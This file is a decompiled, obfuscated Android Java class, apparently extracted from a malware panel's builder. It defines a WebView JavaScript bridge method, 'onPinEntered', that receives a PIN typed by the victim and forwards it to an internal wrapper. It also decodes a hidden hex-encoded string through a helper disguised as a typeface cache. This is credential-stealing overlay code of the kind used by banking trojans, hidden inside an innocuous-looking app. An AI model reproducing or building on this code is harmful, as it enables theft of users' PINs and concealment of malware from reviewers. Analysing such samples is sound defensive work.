package v.s;

import android.webkit.JavascriptInterface;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class mecOg4FyTfQgo6T {
    public final /* synthetic */ UtilNWWrapper dDIMxZXP1V8HdM;

    public mecOg4FyTfQgo6T(UtilNWWrapper utilNWWrapper) {
        this.dDIMxZXP1V8HdM = utilNWWrapper;
    }

    @JavascriptInterface
    public final void onPinEntered(String str) {
        String str2 = UtilNWWrapper.A1BaTVAMeIXMnh;
        TypefaceCache.obtain("0013005F007500C700F300BE00C200B300360064005E008300B000F700C100B300220078005F008600FC00B000DC00A2006A002C001B");
        UtilNWWrapper utilNWWrapper = this.dDIMxZXP1V8HdM;
        utilNWWrapper.runOnUiThread(new A68NpXPqwTFos99nt(utilNWWrapper, str));
    }
}
